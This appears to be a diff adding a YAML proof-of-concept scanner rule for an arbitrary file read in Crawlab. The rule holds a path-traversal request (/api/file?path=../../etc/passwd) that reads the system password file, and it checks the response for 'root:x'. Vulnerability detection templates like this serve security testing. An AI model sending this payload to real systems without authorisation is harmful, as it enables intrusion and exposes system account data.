@@ -1,0 +1,11 @@
+name: poc-yaml-Crawlab-Diretory
+description: >-
+  任意文件读取
+alwaysExecute: false
+matchCount: 1
+rules:
+  - method: GET
+    path: /api/file?path=../../etc/passwd
+    expression:
+      status: 200
+      body_all: ["root:x"]
